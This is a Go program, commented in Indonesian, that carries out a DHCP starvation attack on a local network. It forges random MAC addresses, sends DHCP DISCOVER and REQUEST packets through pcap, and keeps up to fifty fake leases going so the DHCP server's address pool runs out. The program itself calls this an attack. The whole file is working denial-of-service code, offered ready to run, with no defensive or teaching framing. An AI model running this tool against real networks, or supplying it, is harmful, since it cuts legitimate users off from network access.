package main

import (
	"bufio"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// --- Konstanta untuk State Machine ---
const (
	STATE_WAITING_OFFER = iota
	STATE_WAITING_ACK
	STATE_COMPLETED
)

// --- Konfigurasi ---
const (
	MAX_CONCURRENT_SESSIONS = 50               // Maksimal sesi DHCP aktif
	SESSION_TIMEOUT         = 10 * time.Second // Timeout untuk menunggu respons
)

// dhcpSession menyimpan semua informasi untuk satu proses negosiasi DHCP
type dhcpSession struct {
	mac          net.HardwareAddr
	xid          uint32
	state        int
	offeredIP    net.IP
	serverIP     net.IP
	lastActivity time.Time
}

// Fungsi helper untuk membuat MAC acak
func generateRandomMAC() (net.HardwareAddr, error) {
	buf := make([]byte, 6)
	_, err := rand.Read(buf)
	if err != nil {
		return nil, err
	}
	buf[0] = (buf[0] & 0xFE) | 0x02
	return net.HardwareAddr(buf), nil
}

// Fungsi helper untuk mencari interface
func getMACByIP(targetIP net.IP) (net.HardwareAddr, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}
	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.Equal(targetIP) {
					return iface.HardwareAddr, nil
				}
			}
		}
	}
	return nil, fmt.Errorf("tidak bisa menemukan MAC untuk IP %s", targetIP)
}

// --- Pembuat Paket ---

// createDiscoverPacket membuat paket DHCPDISCOVER
func createDiscoverPacket(clientMAC net.HardwareAddr, xid uint32) ([]byte, error) {
	ethLayer := &layers.Ethernet{
		SrcMAC:       clientMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeIPv4,
	}
	ipLayer := &layers.IPv4{
		SrcIP:    net.IPv4(0, 0, 0, 0),
		DstIP:    net.IPv4(255, 255, 255, 255),
		Protocol: layers.IPProtocolUDP,
	}
	udpLayer := &layers.UDP{SrcPort: 68, DstPort: 67}
	udpLayer.SetNetworkLayerForChecksum(ipLayer)

	dhcpOptions := []layers.DHCPOption{
		{Type: layers.DHCPOptMessageType, Data: []byte{byte(layers.DHCPMsgTypeDiscover)}},
		{Type: 55, Data: []byte{1, 3, 6, 15, 119}}, // Parameter Request List
		{Type: layers.DHCPOptEnd},
	}
	dhcpLayer := &layers.DHCPv4{
		Operation:    layers.DHCPOpRequest,
		HardwareType: layers.LinkTypeEthernet,
		ClientHWAddr: clientMAC,
		Xid:          xid,
		Flags:        0x8000,
		Options:      dhcpOptions,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, ethLayer, ipLayer, udpLayer, dhcpLayer); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// createRequestPacket membuat paket DHCPREQUEST
func createRequestPacket(clientMAC net.HardwareAddr, xid uint32, offeredIP, serverIP net.IP) ([]byte, error) {
	ethLayer := &layers.Ethernet{
		SrcMAC:       clientMAC,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeIPv4,
	}
	ipLayer := &layers.IPv4{
		SrcIP:    net.IPv4(0, 0, 0, 0),
		DstIP:    net.IPv4(255, 255, 255, 255),
		Protocol: layers.IPProtocolUDP,
	}
	udpLayer := &layers.UDP{SrcPort: 68, DstPort: 67}
	udpLayer.SetNetworkLayerForChecksum(ipLayer)

	// Opsi untuk REQUEST berbeda dengan DISCOVER
	dhcpOptions := []layers.DHCPOption{
		{Type: layers.DHCPOptMessageType, Data: []byte{byte(layers.DHCPMsgTypeRequest)}},
		{Type: layers.DHCPOptRequestIP, Data: offeredIP.To4()}, // Meminta IP yang ditawarkan
		{Type: layers.DHCPOptServerID, Data: serverIP.To4()},   // Menyebut server mana yang dipilih
		{Type: layers.DHCPOptEnd},
	}
	dhcpLayer := &layers.DHCPv4{
		Operation:    layers.DHCPOpRequest,
		HardwareType: layers.LinkTypeEthernet,
		ClientHWAddr: clientMAC,
		Xid:          xid,
		Flags:        0x8000,
		ClientIP:     offeredIP, // Field ini diisi dengan IP yang diminta
		Options:      dhcpOptions,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, ethLayer, ipLayer, udpLayer, dhcpLayer); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// --- Fungsi Utama ---

func main() {
	// --- 1. Pemilihan Interface (sama seperti sebelumnya) ---
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatalf("Gagal mencari device: %v", err)
	}
	if len(devices) == 0 {
		log.Fatal("Tidak ada interface jaringan yang ditemukan.")
	}
	fmt.Println("Pilih Interface Jaringan:")
	for i, device := range devices {
		fmt.Printf("[%d] %s\n", i+1, device.Description)
		if len(device.Addresses) > 0 {
			for _, addr := range device.Addresses {
				if addr.IP.To4() != nil {
					fmt.Printf("    IP: %s\n", addr.IP)
				}
			}
		}
		fmt.Println("----------------------------------")
	}
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Masukkan nomor interface yang dipilih: ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(devices) {
		log.Fatalf("Pilihan tidak valid. Masukkan angka dari 1 hingga %d.", len(devices))
	}
	selectedDevice := devices[choice-1]
	var selectedIP net.IP
	for _, addr := range selectedDevice.Addresses {
		if addr.IP.To4() != nil {
			selectedIP = addr.IP
			break
		}
	}
	if selectedIP == nil {
		log.Fatalf("Interface yang dipilih tidak memiliki alamat IPv4.")
	}
	srcMAC, err := getMACByIP(selectedIP)
	if err != nil {
		log.Fatalf("Gagal mendapatkan MAC address: %v", err)
	}
	fmt.Printf("\nInterface dipilih: %s (%s)\n", selectedDevice.Description, selectedDevice.Name)
	fmt.Printf("MAC Address Asli: %s\n\n", srcMAC)

	// --- 2. Inisialisasi Handle dan Peta Sesi ---
	listenerHandle, err := pcap.OpenLive(selectedDevice.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Gagal membuka handle listener: %v", err)
	}
	defer listenerHandle.Close()
	if err := listenerHandle.SetBPFFilter("port 67 or port 68"); err != nil {
		log.Fatalf("Gagal set filter BPF: %v", err)
	}
	senderHandle, err := pcap.OpenLive(selectedDevice.Name, 65536, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Gagal membuka handle sender: %v", err)
	}
	defer senderHandle.Close()

	// sync.Map untuk menyimpan sesi yang aman untuk goroutine
	var sessions sync.Map

	// --- 3. Goroutine Pendengar (Lebih Pintar) ---
	go func() {
		packetSource := gopacket.NewPacketSource(listenerHandle, listenerHandle.LinkType())
		for packet := range packetSource.Packets() {
			dhcpLayer := packet.Layer(layers.LayerTypeDHCPv4)
			if dhcpLayer == nil {
				continue
			}
			dhcp, _ := dhcpLayer.(*layers.DHCPv4)

			// Cari session berdasarkan Xid
			sessionInterface, ok := sessions.Load(dhcp.Xid)
			if !ok {
				continue
			}
			session := sessionInterface.(*dhcpSession)

			// Proses DHCPOFFER
			if dhcp.Operation == layers.DHCPOpReply {
				for _, opt := range dhcp.Options {
					if opt.Type == layers.DHCPOptMessageType && len(opt.Data) > 0 && opt.Data[0] == byte(layers.DHCPMsgTypeOffer) {
						session.state = STATE_WAITING_ACK
						session.offeredIP = dhcp.YourClientIP
						// Cari Server Identifier dari opsi
						for _, opt2 := range dhcp.Options {
							if opt2.Type == layers.DHCPOptServerID {
								session.serverIP = net.IP(opt2.Data)
								break
							}
						}
						session.lastActivity = time.Now()
						fmt.Printf(">>> OFFER diterima untuk MAC %s, IP %s (Server: %s) <<<\n", session.mac, session.offeredIP, session.serverIP)
						break
					}
				}
			}

			// Proses DHCPACK
			for _, opt := range dhcp.Options {
				if opt.Type == layers.DHCPOptMessageType && len(opt.Data) > 0 && opt.Data[0] == byte(layers.DHCPMsgTypeAck) {
					if session.state == STATE_WAITING_ACK {
						session.state = STATE_COMPLETED
						fmt.Printf(">>> SUKSES! IP %s DIKUNCI untuk MAC %s (Xid: %d) <<<\n", session.offeredIP, session.mac, session.xid)
					}
					break
				}
			}
		}
	}()

	// --- 4. Loop Utama Manajer Sesi ---
	fmt.Println("Memulai serangan DHCP Starvation yang lengkap...")
	fmt.Println("Tekan Ctrl+C untuk berhenti.")
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		activeCount := 0
		now := time.Now()

		// Scan untuk membersihkan sesi timeout dan menghitung sesi aktif
		sessions.Range(func(key, value interface{}) bool {
			s := value.(*dhcpSession)
			if now.Sub(s.lastActivity) > SESSION_TIMEOUT {
				fmt.Printf("[-] Sesi untuk MAC %s (Xid: %d) timeout. Dihapus.\n", s.mac, s.xid)
				sessions.Delete(key)
			} else if s.state != STATE_COMPLETED {
				activeCount++
			}
			return true
		})

		// Jika masih ada slot, buat sesi baru
		if activeCount < MAX_CONCURRENT_SESSIONS {
			clientMAC, _ := generateRandomMAC()
			xidBytes := make([]byte, 4)
			rand.Read(xidBytes)
			xid := binary.BigEndian.Uint32(xidBytes)

			newSession := &dhcpSession{
				mac:          clientMAC,
				xid:          xid,
				state:        STATE_WAITING_OFFER,
				lastActivity: now,
			}
			sessions.Store(xid, newSession)

			packet, _ := createDiscoverPacket(clientMAC, xid)
			senderHandle.WritePacketData(packet)
			fmt.Printf("[+] Memulai sesi untuk MAC %s (Xid: %d)\n", clientMAC, xid)
		}

		// Proses sesi yang menunggu ACK
		sessions.Range(func(key, value interface{}) bool {
			s := value.(*dhcpSession)
			if s.state == STATE_WAITING_ACK {
				packet, _ := createRequestPacket(s.mac, s.xid, s.offeredIP, s.serverIP)
				senderHandle.WritePacketData(packet)
				fmt.Printf("[*] Mengirim REQUEST untuk MAC %s, IP %s\n", s.mac, s.offeredIP)
				s.lastActivity = now // Update activity time
			}
			return true
		})
	}
}
